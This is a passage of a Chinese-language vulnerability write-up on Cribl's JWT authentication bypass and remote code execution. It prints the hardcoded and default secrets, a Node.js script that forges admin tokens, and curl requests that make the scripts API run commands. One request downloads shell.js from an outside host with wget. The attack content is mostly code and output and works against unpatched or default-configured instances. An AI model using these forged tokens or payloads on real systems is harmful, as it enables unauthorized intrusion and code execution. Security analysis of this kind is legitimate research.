        try {
            a.decode(i || "", f);
            r()
        } catch (e) {
            t.sendStatus(401)
        }
    }
可以看到逻辑非常简单，只要 jwt token 解码成功即可成功通过验证，而且无需如 admin 之类的特定用户名。结合作者的描述，可以认为主要还是硬编码的
secret `d2hvIGxldCB0aGUgZG9ncyBvdXQ=` 增大了伪造的可能性降低了程序的安全性。
顺便看看这个 secret 是什么：
    echo "d2hvIGxldCB0aGUgZG9ncyBvdXQ=" | base64 -d
    who let the dogs out
Emmm，开发者你开心就好。
最后来看一下开发者是使用哪一个库来生成 jwt token 的，搜索 JWT 关键词：
可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到：
写个脚本印证一下：
    var jwt = require('jwt-simple');
    var payload = {
      "username": "admin",
      "exp": 9999999999
    };
    var secret = 'd2hvIGxldCB0aGUgZG9ncyBvdXQ=';
    // encode
    var token = jwt.encode(payload, secret);
    console.log(token);
    // decode
    var decoded = jwt.decode(token, secret);
    console.log(decoded);
可以看到和 poc 的作者所使用的 cookie 是一样的☑️：
    node test.js
    # output
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY
    # { username: 'admin', exp: 9999999999 }
## 修复
让我们看看后续版本是如何修复的，老规矩，使用 v1.5.1 版本的 image，映射到 9001 端口：
    # pull docker
    docker pull cribl/cribl:1.5.1
    # run docker
    docker run -p 9001:9000 -d cribl/cribl:1.5.1
可以看到之前的 exp 已经不能生效了：
    curl 'http://127.0.0.1:9001/api/v1/system/scripts' \
    -H 'Content-Type: application/json' \
    -H 'Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY' \
    --data-binary '{"id":"runme","command":"/usr/bin/wget","args":["http://static.syang.xyz/shell.js","-P","/opt"],"env":{}}' --compressed
    # output
    # Unauthorized
跟进源码，查看 v1.5.1 对程序进行了何种修改：
    var p = 4 * 3600;
    var d = "cribl_auth";
    var h = "/auth";
    var m = "Bearer ";
    var v = [h + "/"];
    var g;
    function y() {
        if (!g) {
            g = l.getCreateCriblSecret()
        }
        return g
    }
    function b(e, t, r) {
        if (e.method === "OPTIONS") {
            r();
            return
        }
        for (var n = 0; n < v.length; n++) {
            if (e.path.startsWith("" + v[n])) {
                r();
                return
            }
        }
        var i = e.cookies && e.cookies[d];
        if (!i) {
            var o = e.header("authorization");
            if (o && o.startsWith(m)) {
                i = o.substr(m.length)
            }
        }
        y().then(function (e) {
            var t = a.decode(i || "", e);
            if (!t.username) throw new Error("Invalid auth token, missing username");
            r()
        }).catch(function (e) {
            t.sendStatus(401)
        })
    }
    // 其中 l.getCreateCriblSecret = w
    function w() {
        if (!b) {
            var e = c.join(process.env.CRIBL_HOME || "", "local", "cribl", "auth", "cribl.secret");
            b = o.callbackToPromise(l.readFile, e).catch(function (t) {
                return u.mkdirp(c.dirname(e)).then(function () {
                    var t = a.randomBytes(256).toString("base64");
                    return u.atomicFileWrite(e, t).then(function () {
                        return t
                    })
                })
            }).then(function (e) {
                return Buffer.from(e.toString(), "base64")
            })
        }
        return b
    }
可以看到关键的 secret 不再硬编码，改成了从 `/opt/local/cribl/auth/cribl.secret` 该文件中进行读取。
那么考虑到使用 docker 中自带的密钥，是否可以伪造 cookie？
    var jwt = require('jwt-simple');
    var payload = {
      "username": "admin",
      "exp": 9999999999
    };
    // encode
    var secret = Buffer.from("vCN2P8hvUL2mvY6JZ5HhkXyNJzaSVvhOhBuZF9h34K6UbrhbPnr23/shnY09hZPUpKOTDIMql1POyPOOEygj67LPyYd57hxLmMgbVQ8IcsxLF3pu+gcc0qzrgzInWpSRXL0t4hTKDhRwR94xo/1G0nZfG8uh8M7jH3Wnr80Jujnyx0fjYhq1sWTd3ESnT2c8fUtqLwyEyx2yGeXKp+pXmrIYgFtjxDemsuUVzZlrj/fTgF+IlgWS2cxxkBRpAxxVurfZVE1E3oP8VM+73QMFOMcWrT8ABqEvhFhGBC/izNR7lKF7rkDjkwftc8UY0uvDOImaC/H/GM3ab53pyDdcNQ==", "base64")
    var token = jwt.encode(payload, secret);
    // decode
    var decoded = jwt.decode(token, secret);
    console.log(decoded);
Emmm，实验成功了。。只能说如果开发者在生产环境中不换默认的 secret 最后还是会翻车，照样未授权 RCE。
    curl 'http://127.0.0.1:9001/api/v1/system/scripts' \
    -H 'Content-Type: application/json' \
    -H 'Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.zRHkFfc7WtMIqFtfvSd2FUyxHxW8TlnVZtn87sNMVYc' \
    --data-binary '{"id":"list","command":"ls","args":["-al"],"env":{}}' --compressed
    # output
    # {"count":1,"items":[{"command":"ls","args":["-al"],"env":{},"id":"list"}]}
## 总结
事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。
分析过程中如有疏漏望各位师傅们指出XD